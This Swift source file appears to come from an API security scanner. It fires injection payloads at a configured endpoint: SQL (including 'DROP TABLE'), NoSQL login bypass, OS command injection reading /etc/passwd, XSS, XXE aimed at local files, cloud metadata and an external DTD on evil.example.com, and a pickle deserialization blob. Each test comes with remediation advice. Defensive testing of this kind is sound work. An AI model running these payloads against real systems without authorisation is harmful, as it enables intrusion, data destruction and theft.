// RADIANT v4.18.0 - REST-03: Input Validation & Injection Executor
// Tests for SQL injection, NoSQL injection, OS command injection, XSS, XXE, deserialization, JSON schema bypass

import Foundation

struct RESTInputValidationExecutor: SecurityTestExecutor {
    let testId: String

    func execute(endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger) async throws -> TestResult {
        let startTime = Date()
        switch testId {
        case "REST-03.1": return try await testSQLInjection(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "REST-03.2": return try await testNoSQLInjection(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "REST-03.3": return try await testOSCommandInjection(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "REST-03.4": return try await testXSS(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "REST-03.5": return try await testXXE(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "REST-03.6": return try await testDeserialization(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        case "REST-03.7": return try await testJSONSchemaBypass(endpoint: endpoint, credentials: credentials, logger: logger, startTime: startTime)
        default:
            return TestResult(status: .error, findings: "Unknown test ID: \(testId)", evidence: [], remediation: nil, executionLog: await logger.getEntries(), duration: 0)
        }
    }

    private func testSQLInjection(endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date) async throws -> TestResult {
        await logger.info("[REST-03.1] Testing SQL injection in API parameters")
        let sqlPayloads: [(label: String, param: String)] = [
            ("Classic OR", "' OR '1'='1"),
            ("UNION SELECT", "' UNION SELECT username,password FROM users--"),
            ("Stacked queries", "'; DROP TABLE users;--"),
            ("Time-based blind", "' OR SLEEP(5)--"),
            ("Boolean-based", "' AND 1=1--"),
        ]
        var findings: [String] = []
        var injectionDetected = false
        for payload in sqlPayloads {
            let encodedParam = payload.param.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? payload.param
            let url = endpoint.url.appendingPathComponent("/api/users").appending(queryItems: [URLQueryItem(name: "search", value: payload.param)])
            let (sc, body) = try await sendRaw(to: url, method: "GET", headers: ["X-Api-Key": credentials.apiKeys["aws_access_key_id"] ?? ""], body: nil, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: sc, headers: [:], body: body)
            let bodyLower = body.lowercased()
            let sqlError = bodyLower.contains("sql") || bodyLower.contains("syntax error") || bodyLower.contains("pg_") || bodyLower.contains("mysql") || bodyLower.contains("sqlite")
            let dataLeak = sc == 200 && body.count > 500 && bodyLower.contains("username")
            if sqlError || dataLeak { injectionDetected = true; findings.append("\(payload.label): SQL injection indicators in response!"); await logger.error("[REST-03.1] FAIL: \(payload.label)") }
            else { findings.append("\(payload.label): No injection indicators (HTTP \(sc))."); await logger.success("[REST-03.1] \(payload.label) safe") }
        }
        let duration = Date().timeIntervalSince(startTime)
        return TestResult(status: injectionDetected ? .failed : .passed, findings: findings.joined(separator: "\n"), evidence: await logger.getEvidence(), remediation: injectionDetected ? "Use parameterized queries/prepared statements exclusively. Never concatenate user input into SQL. Implement input validation and WAF rules for SQL injection patterns." : nil, executionLog: await logger.getEntries(), duration: duration)
    }

    private func testNoSQLInjection(endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date) async throws -> TestResult {
        await logger.info("[REST-03.2] Testing NoSQL injection")
        let nosqlPayloads: [(label: String, body: String)] = [
            ("$gt operator", "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"),
            ("$ne operator", "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"),
            ("$regex operator", "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}"),
            ("$where injection", "{\"$where\":\"this.username=='admin'\"}"),
        ]
        var findings: [String] = []
        var injectionDetected = false
        for payload in nosqlPayloads {
            let (sc, body) = try await sendRaw(to: endpoint.url.appendingPathComponent("/api/auth/login"), method: "POST", headers: ["Content-Type": "application/json", "X-Api-Key": credentials.apiKeys["aws_access_key_id"] ?? ""], body: payload.body, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: sc, headers: [:], body: body)
            if sc == 200 && (body.lowercased().contains("token") || body.lowercased().contains("session")) { injectionDetected = true; findings.append("\(payload.label): Auth bypass via NoSQL injection!"); await logger.error("[REST-03.2] FAIL: \(payload.label)") }
            else { findings.append("\(payload.label): No injection (HTTP \(sc))."); await logger.success("[REST-03.2] \(payload.label) safe") }
        }
        let duration = Date().timeIntervalSince(startTime)
        return TestResult(status: injectionDetected ? .failed : .passed, findings: findings.joined(separator: "\n"), evidence: await logger.getEvidence(), remediation: injectionDetected ? "Sanitize NoSQL operators ($gt, $ne, $regex, $where) from user input. Use strict type checking. Validate input against expected schemas before querying." : nil, executionLog: await logger.getEntries(), duration: duration)
    }

    private func testOSCommandInjection(endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date) async throws -> TestResult {
        await logger.info("[REST-03.3] Testing OS command injection via API")
        let cmdPayloads: [(label: String, param: String)] = [
            ("Pipe injection", "test|id"),
            ("Semicolon chain", "test;cat /etc/passwd"),
            ("Backtick execution", "test`whoami`"),
            ("$() substitution", "test$(id)"),
            ("Newline injection", "test\nid"),
        ]
        var findings: [String] = []
        var injectionDetected = false
        for payload in cmdPayloads {
            let body = "{\"filename\":\"\(payload.param)\",\"action\":\"process\"}"
            let (sc, resp) = try await sendRaw(to: endpoint.url.appendingPathComponent("/api/tools/process"), method: "POST", headers: ["Content-Type": "application/json", "X-Api-Key": credentials.apiKeys["aws_access_key_id"] ?? ""], body: body, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: sc, headers: [:], body: resp)
            let respLower = resp.lowercased()
            let cmdExec = respLower.contains("uid=") || respLower.contains("root:") || respLower.contains("/bin/") || respLower.contains("whoami")
            if cmdExec { injectionDetected = true; findings.append("\(payload.label): Command execution detected!"); await logger.error("[REST-03.3] CRITICAL: \(payload.label)") }
            else { findings.append("\(payload.label): No execution indicators (HTTP \(sc))."); await logger.success("[REST-03.3] \(payload.label) safe") }
        }
        let duration = Date().timeIntervalSince(startTime)
        return TestResult(status: injectionDetected ? .failed : .passed, findings: findings.joined(separator: "\n"), evidence: await logger.getEvidence(), remediation: injectionDetected ? "Never pass user input to OS commands. Use language-native APIs instead of shell execution. If shell commands are unavoidable, use strict allowlists and escape all special characters." : nil, executionLog: await logger.getEntries(), duration: duration)
    }

    private func testXSS(endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date) async throws -> TestResult {
        await logger.info("[REST-03.4] Testing Cross-Site Scripting (XSS) via API")
        let xssPayloads: [(label: String, input: String)] = [
            ("Script tag", "<script>alert('xss')</script>"),
            ("Event handler", "<img src=x onerror=alert('xss')>"),
            ("SVG onload", "<svg onload=alert('xss')>"),
            ("JavaScript URI", "javascript:alert('xss')"),
            ("HTML entity bypass", "&#60;script&#62;alert('xss')&#60;/script&#62;"),
        ]
        var findings: [String] = []
        var xssDetected = false
        for payload in xssPayloads {
            let body = "{\"name\":\"\(payload.input.replacingOccurrences(of: "\"", with: "\\\""))\"}"
            let (sc, resp) = try await sendRaw(to: endpoint.url.appendingPathComponent("/api/users/me"), method: "PATCH", headers: ["Content-Type": "application/json", "X-Api-Key": credentials.apiKeys["aws_access_key_id"] ?? ""], body: body, logger: logger)
            let reflected = resp.contains(payload.input) || (resp.contains("<script>") && resp.contains("alert"))
            if reflected && sc == 200 { xssDetected = true; findings.append("\(payload.label): XSS payload reflected in response!"); await logger.error("[REST-03.4] FAIL: \(payload.label)") }
            else { findings.append("\(payload.label): Sanitized or rejected (HTTP \(sc))."); await logger.success("[REST-03.4] \(payload.label) safe") }
        }
        let duration = Date().timeIntervalSince(startTime)
        return TestResult(status: xssDetected ? .failed : .passed, findings: findings.joined(separator: "\n"), evidence: await logger.getEvidence(), remediation: xssDetected ? "Encode/escape all output based on context (HTML, JavaScript, URL, CSS). Use Content-Type: application/json for API responses. Implement Content-Security-Policy headers." : nil, executionLog: await logger.getEntries(), duration: duration)
    }

    private func testXXE(endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date) async throws -> TestResult {
        await logger.info("[REST-03.5] Testing XML External Entity (XXE) injection")
        let xxePayloads: [(label: String, xml: String)] = [
            ("File disclosure", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"),
            ("SSRF via XXE", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>"),
            ("Parameter entity", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.example.com/xxe.dtd\">%xxe;]><root>test</root>"),
        ]
        var findings: [String] = []
        var xxeDetected = false
        for payload in xxePayloads {
            let (sc, body) = try await sendRaw(to: endpoint.url.appendingPathComponent("/api/import"), method: "POST", headers: ["Content-Type": "application/xml", "X-Api-Key": credentials.apiKeys["aws_access_key_id"] ?? ""], body: payload.xml, logger: logger)
            await logger.addHTTPResponseEvidence(statusCode: sc, headers: [:], body: body)
            let bodyLower = body.lowercased()
            if bodyLower.contains("root:") || bodyLower.contains("ami-id") || bodyLower.contains("/bin/") { xxeDetected = true; findings.append("\(payload.label): XXE exploitation successful!"); await logger.error("[REST-03.5] CRITICAL: \(payload.label)") }
            else { findings.append("\(payload.label): No XXE indicators (HTTP \(sc))."); await logger.success("[REST-03.5] \(payload.label) safe") }
        }
        let duration = Date().timeIntervalSince(startTime)
        return TestResult(status: xxeDetected ? .failed : .passed, findings: findings.joined(separator: "\n"), evidence: await logger.getEvidence(), remediation: xxeDetected ? "Disable XML external entity processing in all XML parsers. Use JSON instead of XML where possible. If XML is required, configure the parser to disallow DTDs and external entities." : nil, executionLog: await logger.getEntries(), duration: duration)
    }

    private func testDeserialization(endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date) async throws -> TestResult {
        await logger.info("[REST-03.6] Testing deserialization attacks")
        let deserPayloads: [(label: String, contentType: String, body: String)] = [
            ("Java serialized", "application/x-java-serialized-object", "rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ=="),
            ("Python pickle", "application/octet-stream", "gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="),
            ("PHP serialized", "application/x-php-serialized", "O:8:\"stdClass\":1:{s:4:\"exec\";s:2:\"id\";}"),
        ]
        var findings: [String] = []
        var deserVulnerable = false
        for payload in deserPayloads {
            let (sc, body) = try await sendRaw(to: endpoint.url.appendingPathComponent("/api/import"), method: "POST", headers: ["Content-Type": payload.contentType, "X-Api-Key": credentials.apiKeys["aws_access_key_id"] ?? ""], body: payload.body, logger: logger)
            let bodyLower = body.lowercased()
            if bodyLower.contains("uid=") || bodyLower.contains("executed") || bodyLower.contains("success") && sc == 200 { deserVulnerable = true; findings.append("\(payload.label): Deserialization may have executed!"); await logger.error("[REST-03.6] FAIL: \(payload.label)") }
            else if sc == 415 || sc == 400 { findings.append("\(payload.label): Content type rejected (HTTP \(sc))."); await logger.success("[REST-03.6] \(payload.label) rejected") }
            else { findings.append("\(payload.label): HTTP \(sc) — review needed."); await logger.info("[REST-03.6] \(payload.label): \(sc)") }
        }
        let duration = Date().timeIntervalSince(startTime)
        return TestResult(status: deserVulnerable ? .failed : .passed, findings: findings.joined(separator: "\n"), evidence: await logger.getEvidence(), remediation: deserVulnerable ? "Never deserialize untrusted data. Restrict accepted content types. If deserialization is needed, use safe formats (JSON) and validate against a strict schema before processing." : nil, executionLog: await logger.getEntries(), duration: duration)
    }

    private func testJSONSchemaBypass(endpoint: EndpointConfiguration, credentials: SecurityTestCredentials, logger: TestLogger, startTime: Date) async throws -> TestResult {
        await logger.info("[REST-03.7] Testing JSON schema validation bypass")
        let invalidPayloads: [(label: String, body: String)] = [
            ("Wrong types", "{\"name\":123,\"email\":true,\"age\":\"not_a_number\"}"),
            ("Missing required", "{\"optional_field\":\"value\"}"),
            ("Extra fields", "{\"name\":\"test\",\"email\":\"test@test.com\",\"__admin\":true,\"_internal\":\"exploit\"}"),
            ("Deeply nested", "{\"a\":{\"b\":{\"c\":{\"d\":{\"e\":{\"f\":{\"g\":{\"h\":{\"i\":{\"j\":\"deep\"}}}}}}}}}}"),
            ("Oversized string", "{\"name\":\"\(String(repeating: "A", count: 10000))\"}"),
        ]
        var findings: [String] = []
        var validationMissing = false
        for payload in invalidPayloads {
            let (sc, body) = try await sendRaw(to: endpoint.url.appendingPathComponent("/api/users"), method: "POST", headers: ["Content-Type": "application/json", "X-Api-Key": credentials.apiKeys["aws_access_key_id"] ?? ""], body: payload.body, logger: logger)
            if sc == 200 || sc == 201 { validationMissing = true; findings.append("\(payload.label): ACCEPTED (HTTP \(sc))!"); await logger.error("[REST-03.7] FAIL: \(payload.label)") }
            else if sc == 400 || sc == 422 { findings.append("\(payload.label): Validated and rejected (HTTP \(sc))."); await logger.success("[REST-03.7] \(payload.label) validated") }
            else { findings.append("\(payload.label): HTTP \(sc)."); await logger.info("[REST-03.7] \(payload.label): \(sc)") }
        }
        let duration = Date().timeIntervalSince(startTime)
        return TestResult(status: validationMissing ? .failed : .passed, findings: findings.joined(separator: "\n"), evidence: await logger.getEvidence(), remediation: validationMissing ? "Implement strict JSON schema validation on all API endpoints. Validate types, required fields, string lengths, and nesting depth. Reject unknown fields. Use a schema validation library." : nil, executionLog: await logger.getEntries(), duration: duration)
    }

    private func sendRaw(to url: URL, method: String, headers: [String: String], body: String?, logger: TestLogger) async throws -> (Int, String) {
        var request = URLRequest(url: url); request.httpMethod = method; request.timeoutInterval = 15
        for (k, v) in headers { request.setValue(v, forHTTPHeaderField: k) }
        if let body = body { request.httpBody = body.data(using: .utf8) }
        do { let (data, response) = try await URLSession.shared.data(for: request); return ((response as? HTTPURLResponse)?.statusCode ?? 0, String(data: data, encoding: .utf8) ?? "") }
        catch { return (0, "Error: \(error.localizedDescription)") }
    }
}
